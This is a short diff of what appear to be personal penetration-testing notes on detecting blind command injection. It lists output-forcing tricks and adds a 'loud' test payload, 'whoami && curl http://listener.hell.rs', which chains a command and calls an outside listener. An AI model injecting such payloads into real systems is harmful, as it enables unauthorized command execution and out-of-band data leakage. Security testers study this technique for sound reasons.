@@ -16,5 +16,6 @@ detecting blindv
     force output (example: whoami > output.txt && cat output.txt)
     curl / send data
     
-
+loud pentest:
+    makr payload that does both? whoami && curl http://listener.hell.rs
 
